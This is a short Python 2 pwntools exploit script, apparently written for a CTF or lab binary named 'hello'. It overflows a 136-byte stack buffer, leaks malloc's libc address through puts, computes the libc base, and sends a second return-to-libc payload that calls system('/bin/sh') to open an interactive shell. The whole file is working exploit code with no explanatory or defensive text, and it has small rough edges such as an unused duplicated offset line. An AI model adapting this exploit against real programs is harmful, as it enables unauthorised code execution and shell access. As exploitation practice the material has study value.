#!/usr/bin/env python3
from pwn import *
context(log_level='debug', arch='i386', os='linux')

r = process('hello')
elf = ELF('./hello')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload = 'A' * 136
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['malloc'])
r.recvuntil('name?\n')
r.sendline(payload)
r.recvuntil(', ')
pre = r.recv(136)
res = int(r.recvuntil('\n'), 16)
print '============================'
print res
print '============================'
# objdump -R /lib/i386-linux-gnu/libc.so.6 |grep malloc
malloc_offset = 0x001b2f10
malloc_offset = 0x001b2f10

libcbase = res - libc.sym['malloc']
#print "libc base address is 0x:" + libcbase

system = libcbase + libc.sym['system']
binsh = libcbase + next(libc.search('/bin/sh'))

payload2 = 'A'* 136
payload2 += p32(system)
payload2 += 'MMMM'
payload2 += p32(binsh)

r.recvline()
r.recvline()

r.sendline(payload2)

r.interactive()



